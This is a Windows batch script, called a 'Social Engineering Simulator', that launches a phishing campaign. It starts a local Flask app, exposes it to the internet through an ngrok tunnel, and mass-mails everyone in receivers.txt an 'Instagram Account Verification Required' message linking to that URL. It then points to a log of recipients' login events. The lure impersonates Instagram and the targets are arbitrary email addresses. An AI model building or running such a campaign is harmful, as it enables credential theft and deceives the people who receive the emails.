@echo off
REM Social Engineering Simulator - Email Blast with ngrok

setlocal enabledelayedexpansion

echo.
echo =====================================================
echo   📧 SOCIAL ENGINEERING SIMULATOR - EMAIL BLAST
echo =====================================================
echo.

REM Check if ngrok exists
if not exist "ngrok.exe" (
    echo ❌ ERROR: ngrok.exe not found!
    echo.
    echo Download ngrok from: https://ngrok.com/download
    echo Extract ngrok.exe to this folder
    echo.
    pause
    exit /b 1
)

REM Check if receivers.txt exists
if not exist "receivers.txt" (
    echo ❌ ERROR: receivers.txt not found!
    echo.
    echo Create receivers.txt with email addresses (one per line)
    echo.
    pause
    exit /b 1
)

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo ❌ ERROR: Python not found!
    echo Please install Python from https://www.python.org/
    echo.
    pause
    exit /b 1
)

echo ✅ All checks passed!
echo.
echo [STEP 1/3] Installing/checking dependencies...
pip install -q -r requirements.txt >nul 2>&1

echo.
echo [STEP 2/3] Starting Flask app...
start "Flask App" /B python app.py
timeout /t 2 >nul

echo.
echo [STEP 3/3] Starting ngrok tunnel...
start "ngrok Tunnel" /B ngrok http 5000
timeout /t 3 >nul

echo.
echo =====================================================
echo 🚀 READY TO SEND EMAILS!
echo =====================================================
echo.
echo 📋 Recipients from receivers.txt will receive:
echo   - Subject: Instagram Account Verification Required
echo   - With automatic ngrok public URL in the link
echo.
echo ⏳ Waiting for ngrok to initialize (5 seconds)...
echo.

timeout /t 5 >nul

echo 📧 Sending emails with public ngrok URL...
echo.

python mail_sender.py

echo.
echo =====================================================
echo ✅ EMAIL BLAST COMPLETE!
echo =====================================================
echo.
echo 📊 Check login_events.txt to see when recipients click the link
echo.
echo 🛑 Press any key to stop (ngrok and Flask will remain running in background)
echo.

pause
